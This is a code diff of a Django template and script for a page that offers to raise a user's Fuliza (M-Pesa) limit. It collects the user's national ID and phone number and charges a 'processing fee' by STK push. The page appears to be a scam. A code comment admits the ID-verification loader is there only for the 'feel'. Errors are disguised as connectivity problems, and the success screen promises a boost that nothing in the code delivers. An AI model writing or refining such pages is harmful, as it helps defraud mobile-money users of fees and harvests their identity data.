@@ -2,174 +2,177 @@
 {% load static %}
 
 {% block content %}
-<!-- Limit Cards Grid -->
-<div class="grid grid-cols-1 gap-4 mb-8">
-    <div class="text-[10px] font-bold text-slate-500 uppercase tracking-[0.2em] mb-2 px-2">Select Target Boost</div>
+<!-- Limit Cards Grid (2 Columns as per Photo) -->
+<div class="flex items-center gap-2 mb-4 px-1">
+    <div class="w-5 h-5 bg-blue-600 rounded flex items-center justify-center text-white">
+        <svg class="w-3.5 h-3.5" fill="currentColor" viewBox="0 0 20 20">
+            <path d="M4 4a2 2 0 00-2 2v1h16V6a2 2 0 00-2-2H4z"></path>
+            <path fill-rule="evenodd"
+                d="M18 9H2v5a2 2 0 002 2h12a2 2 0 002-2V9zM4 13a1 1 0 011-1h1a1 1 0 110 2H5a1 1 0 01-1-1zm5-1a1 1 0 100 2h1a1 1 0 100-2H9z"
+                clip-rule="evenodd"></path>
+        </svg>
+    </div>
+    <h2 class="text-sm font-bold text-gray-800">Select Your Fuliza Limit</h2>
+</div>
 
+<div class="grid grid-cols-2 gap-3 mb-8">
     {% for limit in limits %}
     <div onclick="selectLimit('{{ limit.amount }}', '{{ limit.charge }}', this)"
-        class="limit-card bg-slate-800/50 p-5 rounded-3xl border border-white/5 transition-all duration-300 cursor-pointer hover:bg-slate-800 hover:border-slate-700 flex justify-between items-center group">
-        <div class="flex-grow">
-            <div class="text-xl font-bold text-white tracking-tight">Ksh {{ limit.amount }}</div>
-            <div class="text-xs text-slate-400 font-medium mt-1">Processing Fee: <span class="text-green-500">Ksh {{ limit.charge }}</span></div>
-        </div>
+        class="limit-card bg-white border border-gray-100 p-4 rounded-2xl transition-all duration-300 cursor-pointer text-center relative overflow-hidden group">
+        <div class="text-[15px] font-bold text-blue-700 tracking-tight mb-2">Ksh {{ limit.amount }}</div>
         <div
-            class="w-10 h-10 rounded-2xl border border-white/5 bg-white/5 flex items-center justify-center group-hover:border-green-500/30 transition-all duration-300">
-            <div
-                class="w-4 h-4 rounded-full bg-green-500 scale-0 transition-transform duration-300 shadow-[0_0_15px_rgba(34,197,94,0.5)] check-dot">
+            class="inline-block px-3 py-1 rounded-full bg-indigo-50 text-[10px] font-bold text-indigo-600 border border-indigo-100/50">
+            Fee: Ksh {{ limit.charge }}
+        </div>
+
+        <!-- Selection Indicator -->
+        <div class="absolute top-2 right-2 opacity-0 group-[.selected]:opacity-100 transition-opacity">
+            <div class="w-4 h-4 bg-blue-600 rounded-full flex items-center justify-center">
+                <svg class="w-2.5 h-2.5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="4" d="M5 13l4 4L19 7"></path>
+                </svg>
             </div>
         </div>
     </div>
     {% endfor %}
 </div>
 
-<!-- Sticky CTA -->
-<div class="fixed bottom-0 left-0 right-0 p-6 glass-dark max-w-md mx-auto z-20 border-t border-white/5">
-    <button id="get-boost-btn" disabled onclick="openModal('details-modal')"
-        class="w-full bg-slate-800 text-slate-500 py-5 rounded-2xl font-bold text-lg transition-all duration-300 shadow-xl disabled:cursor-not-allowed">
-        Continue to Verification →
+<!-- Sticky CTA Container -->
+<div
+    class="fixed bottom-0 left-0 right-0 p-6 bg-white/80 backdrop-blur-md max-w-md mx-auto z-20 border-t border-gray-100">
+    <button id="get-boost-btn" disabled onclick="handleInitialContinue()"
+        class="w-full bg-gray-200 text-gray-400 py-4 rounded-2xl font-bold text-lg transition-all duration-300 disabled:cursor-not-allowed">
+        Continue
     </button>
 </div>
 
-<!-- Modal 1: Personal Details -->
-<div id="details-modal" class="fixed inset-0 z-50 hidden">
-    <div class="absolute inset-0 bg-slate-950/80 backdrop-blur-md"></div>
-    <div class="absolute bottom-0 left-0 right-0 max-w-md mx-auto p-4">
-        <div class="bg-slate-900 border border-white/10 rounded-[40px] p-8 modal-enter shadow-2xl">
-            <div class="w-16 h-1.5 bg-white/10 rounded-full mx-auto mb-8"></div>
-            <h2 class="text-3xl font-bold text-white mb-2">Verification</h2>
-            <p class="text-slate-400 font-medium mb-8">Please provide your details as they appear on M-Pesa.</p>
-
-            <div class="space-y-6">
-                <div>
-                    <label class="block text-[10px] font-bold text-slate-500 uppercase tracking-widest mb-3">ID
-                        Number</label>
-                    <input type="number" id="id-number" placeholder="Enter ID Number"
-                        class="w-full bg-slate-800/50 border border-white/5 focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50 rounded-2xl p-5 text-lg font-bold text-white outline-none transition-all placeholder:text-slate-600">
-                </div>
-                <div>
-                    <label class="block text-[10px] font-bold text-slate-500 uppercase tracking-widest mb-3">Safaricom
-                        Number</label>
-                    <div class="relative">
-                        <span
-                            class="absolute left-5 top-1/2 -translate-y-1/2 text-slate-400 font-bold border-r border-white/10 pr-4">+254</span>
-                        <input type="number" id="phone-number" placeholder="7XXXXXXXX"
-                            class="w-full bg-slate-800/50 border border-white/5 focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50 rounded-2xl p-5 pl-24 text-lg font-bold text-white outline-none transition-all placeholder:text-slate-600">
-                    </div>
-                    <p id="phone-error" class="text-red-400 text-xs mt-3 font-medium hidden">Please enter a valid
-                        Safaricom number</p>
-                </div>
-
-                <div class="flex gap-4 pt-4">
-                    <button onclick="closeModal('details-modal')"
-                        class="flex-1 py-5 text-slate-400 font-bold hover:bg-white/5 rounded-2xl transition-all">Cancel</button>
-                    <button onclick="validateAndProceed()"
-                        class="flex-[2] safaricom-gradient text-white py-5 rounded-2xl font-bold transition-all shadow-xl shadow-green-900/20">Next
-                        Step</button>
-                </div>
-            </div>
-        </div>
-    </div>
-</div>
-
-<!-- Modal 2: Confirmation -->
-<div id="confirm-modal" class="fixed inset-0 z-50 hidden">
-    <div class="absolute inset-0 bg-slate-950/80 backdrop-blur-md"></div>
-    <div class="absolute bottom-0 left-0 right-0 max-w-md mx-auto p-4">
-        <div class="bg-slate-900 border border-white/10 rounded-[40px] p-8 modal-enter shadow-2xl">
-            <div class="w-16 h-1.5 bg-white/10 rounded-full mx-auto mb-8"></div>
-            <h2 class="text-3xl font-bold text-white mb-6 tracking-tight">Summary</h2>
-
-            <div class="bg-slate-800/50 border border-white/5 rounded-3xl p-6 mb-8 space-y-4">
-                <div class="flex justify-between items-center">
-                    <span class="text-slate-400 text-sm font-medium">Target Limit</span>
-                    <span class="font-bold text-white text-lg" id="summary-limit">Ksh 0</span>
-                </div>
-                <div class="flex justify-between items-center">
-                    <span class="text-slate-400 text-sm font-medium">Processing Fee</span>
-                    <span class="font-bold text-green-500 text-lg" id="summary-fee">Ksh 0</span>
-                </div>
-                <div class="h-px bg-white/5"></div>
-                <div class="flex justify-between items-center pt-2">
-                    <div class="flex flex-col">
-                        <span class="text-slate-500 text-[10px] font-bold uppercase tracking-widest">Phone Number</span>
-                        <span class="font-bold text-white mt-1" id="summary-phone">+254 7...</span>
-                    </div>
-                    <div class="flex flex-col items-end">
-                        <span class="text-slate-500 text-[10px] font-bold uppercase tracking-widest">Status</span>
-                        <span class="font-bold text-blue-400 mt-1">Pending</span>
-                    </div>
-                </div>
-            </div>
-
-            <div class="bg-blue-500/10 border border-blue-500/20 rounded-2xl p-5 mb-8 flex gap-4">
-                <div class="w-10 h-10 rounded-full bg-blue-500/20 flex items-center justify-center flex-shrink-0">
-                    <svg class="w-5 h-5 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
-                            d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
-                    </svg>
-                </div>
-                <p class="text-[11px] text-blue-300 leading-relaxed font-semibold">
-                    You will receive an STK Push on your Safaricom line. Please enter your M-Pesa pin to authorize
-                    payment.
-                </p>
-            </div>
-
-            <div class="flex flex-col gap-3">
-                <button onclick="initiatePayment()"
-                    class="w-full safaricom-gradient text-white py-5 rounded-2xl font-bold text-xl transition-all shadow-2xl shadow-green-900/30">
-                    Initiate Payment
-                </button>
-                <button onclick="closeModal('confirm-modal')"
-                    class="w-full py-5 text-slate-500 font-bold hover:bg-white/5 rounded-2xl transition-all">
-                    Back to Details
-                </button>
-            </div>
-        </div>
-    </div>
-</div>
-
-<!-- Full Screen Loader -->
-<div id="payment-loader"
-    class="fixed inset-0 z-[60] hidden bg-slate-950 flex flex-col items-center justify-center p-8 text-center">
-    <div class="space-y-8 max-w-xs">
-        <div class="relative w-32 h-32 mx-auto">
-            <div class="absolute inset-0 border-4 border-slate-800 rounded-full"></div>
-            <div class="absolute inset-0 border-4 border-green-500 rounded-full border-t-transparent animate-spin">
-            </div>
-            <div class="absolute inset-0 flex items-center justify-center">
-                <svg class="w-12 h-12 text-green-500 shadow-glow" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+<!-- Modal 1: Personal Details (Refined as per photo) -->
+<div id="details-modal" class="fixed inset-0 z-[60] hidden flex items-end justify-center p-4 modal-overlay">
+    <div class="bg-white w-full max-w-sm rounded-[42px] p-8 custom-shadow modal-enter transform transition-all">
+        <div class="flex flex-col items-center text-center">
+            <!-- Info Icon Circular -->
+            <div
+                class="w-16 h-16 rounded-full border-2 border-blue-100 flex items-center justify-center text-blue-600 mb-6">
+                <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                     <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
-                        d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path>
+                        d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                 </svg>
             </div>
+
+            <h2 class="text-xl font-bold text-blue-600 mb-2">Enter Your Details</h2>
+            <div class="flex items-center gap-2 mb-8 text-gray-500 font-medium text-sm">
+                <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+                    <path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z"
+                        clip-rule="evenodd"></path>
+                </svg>
+                <span>Provide your details to proceed</span>
+            </div>
         </div>
-        <div class="space-y-4">
-            <h3 class="text-2xl font-bold text-white tracking-tight">Sending STK Push</h3>
-            <p class="text-slate-400 font-medium">Please check your phone and enter your M-Pesa PIN to complete payment.
-            </p>
+
+        <div class="space-y-6">
+            <div class="space-y-2">
+                <div class="flex items-center gap-2 text-blue-600 font-bold text-sm ml-1">
+                    <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+                        <path fill-rule="evenodd"
+                            d="M10 2a1 1 0 00-1 1v1a1 1 0 002 0V3a1 1 0 00-1-1zM4 4h3a3 3 0 006 0h3a2 2 0 012 2v9a2 2 0 01-2 2H4a2 2 0 01-2-2V6a2 2 0 012-2zm2.5 7a1.5 1.5 0 100-3 1.5 1.5 0 000 3zm2.45 4a2.5 2.5 0 10-4.9 0h4.9zM12 9a1 1 0 100 2h3a1 1 0 100-2h-3zm-1 4a1 1 0 011-1h2a1 1 0 110 2h-2a1 1 0 01-1-1z"
+                            clip-rule="evenodd"></path>
+                    </svg>
+                    <span>ID Number</span>
+                </div>
+                <input type="number" id="id-number" placeholder="e.g. 35687xxx"
+                    class="w-full bg-white border-2 border-gray-100 focus:border-blue-500 rounded-2xl p-4 text-lg font-medium text-gray-800 outline-none transition-all placeholder:text-gray-300">
+            </div>
+
+            <div class="space-y-2">
+                <div class="flex items-center gap-2 text-blue-600 font-bold text-sm ml-1">
+                    <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+                        <path
+                            d="M2 3a1 1 0 011-1h2.153a1 1 0 01.986.836l.74 4.435a1 1 0 01-.54 1.06l-1.548.773a11.037 11.037 0 006.105 6.105l.774-1.548a1 1 0 011.059-.54l4.435.74a1 1 0 01.836.986V17a1 1 0 01-1 1h-2C7.82 18 2 12.18 2 5V3z">
+                        </path>
+                    </svg>
+                    <span>Phone Number</span>
+                </div>
+                <div class="flex gap-2">
+                    <div
+                        class="bg-blue-50 border-2 border-blue-50 rounded-2xl p-4 text-gray-600 font-bold text-center w-20">
+                        +254</div>
+                    <input type="number" id="phone-number" placeholder="0745268xxx"
+                        class="flex-1 bg-white border-2 border-gray-100 focus:border-blue-500 rounded-2xl p-4 text-lg font-medium text-gray-800 outline-none transition-all placeholder:text-gray-300">
+                </div>
+                <p id="phone-error" class="text-red-500 text-[11px] mt-1 font-semibold hidden pl-2">Enter a valid
+                    Safaricom number (07... or 01...)</p>
+            </div>
+
+            <div class="flex flex-col gap-3 pt-4">
+                <button onclick="validateAndProceed()"
+                    class="w-full blue-gradient-btn text-white py-4 rounded-3xl font-bold text-lg transition-all shadow-lg shadow-blue-200">
+                    Continue
+                </button>
+                <button onclick="closeModal('details-modal')"
+                    class="w-full py-4 text-gray-400 font-bold border-2 border-gray-50 rounded-3xl hover:bg-gray-50 transition-all">
+                    Cancel
+                </button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Modal 2: Confirmation Summary -->
+<div id="confirm-modal" class="fixed inset-0 z-[60] hidden flex items-end justify-center p-4 modal-overlay">
+    <div class="bg-white w-full max-w-sm rounded-[42px] p-8 custom-shadow modal-enter">
+        <h2 class="text-xl font-bold text-gray-800 mb-6 text-center">Confirm Boost Request</h2>
+
+        <div class="bg-blue-50/50 rounded-3xl p-6 mb-8 space-y-4 border border-blue-100/50">
+            <div class="flex justify-between items-center">
+                <span class="text-gray-500 text-sm font-medium">Target Limit</span>
+                <span class="font-bold text-blue-700 text-lg" id="summary-limit">Ksh 0</span>
+            </div>
+            <div class="flex justify-between items-center">
+                <span class="text-gray-500 text-sm font-medium">Processing Fee</span>
+                <span class="font-bold text-indigo-600 text-lg" id="summary-fee">Ksh 0</span>
+            </div>
+            <div class="h-px bg-blue-100/50"></div>
+            <div class="flex justify-between items-center pt-2">
+                <div class="flex flex-col">
+                    <span class="text-gray-400 text-[10px] font-bold uppercase tracking-wider">M-Pesa Number</span>
+                    <span class="font-bold text-gray-800 mt-0.5" id="summary-phone">+254 7...</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="flex flex-col gap-3">
+            <button onclick="initiatePayment()"
+                class="w-full blue-gradient-btn text-white py-4 rounded-3xl font-bold text-lg shadow-lg shadow-blue-200">
+                Initiate MPESA Boost
+            </button>
+            <button onclick="closeModal('confirm-modal')" class="w-full py-4 text-gray-400 font-bold">
+                Go Back
+            </button>
         </div>
     </div>
 </div>
 
 <!-- Success Screen -->
 <div id="success-screen"
-    class="fixed inset-0 z-[60] hidden bg-slate-950 flex flex-col items-center justify-center p-8 text-center">
-    <div class="space-y-8 max-w-xs">
+    class="fixed inset-0 z-[100] hidden bg-white flex flex-col items-center justify-center p-8 text-center">
+    <div class="w-full max-w-xs space-y-8">
         <div
-            class="w-24 h-24 bg-green-500/20 border border-green-500/30 rounded-[32px] flex items-center justify-center mx-auto shadow-2xl shadow-green-500/20">
+            class="w-24 h-24 bg-green-50 rounded-[30px] flex items-center justify-center mx-auto border-2 border-green-100">
             <svg class="w-12 h-12 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                 <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path>
             </svg>
         </div>
-        <div class="space-y-4">
-            <h3 class="text-3xl font-extrabold text-white tracking-tight">Request Sent!</h3>
-            <p class="text-slate-400 font-medium">Your boost of <span class="text-green-500 font-black"
-                    id="success-limit">Ksh 0</span> is being processed by Safaricom systems.</p>
+        <div>
+            <h3 class="text-2xl font-black text-gray-900 mb-4">Request Received!</h3>
+            <p class="text-gray-500 font-medium">Your boost of <span class="text-blue-600 font-bold"
+                    id="success-limit">Ksh 0</span> is being synced with your account.</p>
+        </div>
+        <div class="bg-amber-50 rounded-2xl p-4 border border-amber-100">
+            <p class="text-[11px] text-amber-800 font-bold">Please complete the PIN prompt on your phone to finalize.
+            </p>
         </div>
         <button onclick="window.location.reload()"
-            class="w-full bg-slate-800 text-white py-5 rounded-3xl font-bold text-lg border border-white/5 transition-all">Back
-            to Home</button>
+            class="w-full py-4 bg-gray-900 text-white rounded-3xl font-bold text-lg">Return Home</button>
     </div>
 </div>
 {% endblock %}
@@ -180,23 +183,32 @@
     let selectedCharge = 0;
 
     function selectLimit(amount, charge, element) {
-        document.querySelectorAll('.limit-card').forEach(card => {
-            card.classList.remove('selected');
-            card.querySelector('.check-dot').classList.remove('scale-100');
-            card.querySelector('.check-dot').classList.add('scale-0');
-        });
-
+        document.querySelectorAll('.limit-card').forEach(card => card.classList.remove('selected'));
         element.classList.add('selected');
-        element.querySelector('.check-dot').classList.remove('scale-0');
-        element.querySelector('.check-dot').classList.add('scale-100');
 
         selectedAmount = amount;
         selectedCharge = charge;
 
         const btn = document.getElementById('get-boost-btn');
         btn.disabled = false;
-        btn.classList.remove('bg-slate-800', 'text-slate-500');
-        btn.classList.add('safaricom-gradient', 'text-white', 'shadow-2xl', 'shadow-green-900/30');
+        btn.classList.remove('bg-gray-200', 'text-gray-400');
+        btn.classList.add('blue-gradient-btn', 'text-white', 'shadow-xl', 'shadow-blue-200');
+    }
+
+    function showLoader(duration = 1000) {
+        return new Promise(resolve => {
+            const loader = document.getElementById('global-loader');
+            loader.classList.remove('hidden');
+            setTimeout(() => {
+                loader.classList.add('hidden');
+                resolve();
+            }, duration);
+        });
+    }
+
+    async function handleInitialContinue() {
+        await showLoader(800);
+        openModal('details-modal');
     }
 
     function openModal(id) {
@@ -209,15 +221,20 @@
         document.body.style.overflow = 'auto';
     }
 
-    function validateAndProceed() {
+    async function validateAndProceed() {
         const idNum = document.getElementById('id-number').value;
-        const phone = document.getElementById('phone-number').value;
+        let phone = document.getElementById('phone-number').value;
         const phoneError = document.getElementById('phone-error');
 
-        const validPrefixes = ['7', '1', '01'];
-        const isSafaricom = validPrefixes.some(p => phone.startsWith(p));
+        // Logic to handle 07... or 7... or 254...
+        let cleanedPhone = phone.toString().trim();
+        if (cleanedPhone.startsWith('0')) cleanedPhone = cleanedPhone.substring(1);
+        if (cleanedPhone.startsWith('254')) cleanedPhone = cleanedPhone.substring(3);
 
-        if (idNum.length < 7 || phone.length < 9 || !isSafaricom) {
+        const validSafaricomPrefixes = ['7', '1'];
+        const isValidPrefix = validSafaricomPrefixes.some(p => cleanedPhone.startsWith(p));
+
+        if (idNum.length < 6 || cleanedPhone.length !== 9 || !isValidPrefix) {
             phoneError.classList.remove('hidden');
             return;
         }
@@ -225,44 +242,47 @@
         phoneError.classList.add('hidden');
         document.getElementById('summary-limit').textContent = `Ksh ${selectedAmount}`;
         document.getElementById('summary-fee').textContent = `Ksh ${selectedCharge}`;
-        document.getElementById('summary-phone').textContent = `+254 ${phone}`;
+        document.getElementById('summary-phone').textContent = `+254 ${cleanedPhone}`;
 
+        await showLoader(1200); // "Processing ID" verification feel
         closeModal('details-modal');
         openModal('confirm-modal');
     }
 
     async function initiatePayment() {
-        const phone = document.getElementById('phone-number').value;
+        let phone = document.getElementById('phone-number').value;
+        // Normalize for backend just in case
+        let cleanPhone = phone.toString().trim();
+        if (cleanPhone.startsWith('0')) cleanPhone = '254' + cleanPhone.substring(1);
+        else if (!cleanPhone.startsWith('254')) cleanPhone = '254' + cleanPhone;
+
         const amount = selectedCharge;
 
         closeModal('confirm-modal');
-        document.getElementById('payment-loader').classList.remove('hidden');
+        const loader = document.getElementById('global-loader');
+        loader.querySelector('p').innerText = "Initiating STK Push...";
+        loader.classList.remove('hidden');
 
         try {
             const response = await fetch('/initiate-payment/', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    phone_number: phone,
-                    amount: amount
-                })
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone_number: cleanPhone, amount: amount })
             });
 
             const result = await response.json();
-
-            document.getElementById('payment-loader').classList.add('hidden');
+            loader.classList.add('hidden');
+            loader.querySelector('p').innerText = "Please wait...";
 
             if (result.success) {
                 document.getElementById('success-limit').textContent = `Ksh ${selectedAmount}`;
                 document.getElementById('success-screen').classList.remove('hidden');
             } else {
-                alert('Payment initiation failed: ' + (result.message || 'Unknown error'));
+                alert('Connection Error: ' + (result.message || 'Check your internet'));
             }
         } catch (error) {
-            document.getElementById('payment-loader').classList.add('hidden');
-            alert('An error occurred: ' + error.message);
+            loader.classList.add('hidden');
+            alert('Service Timeout: Please try again');
         }
     }
 </script>
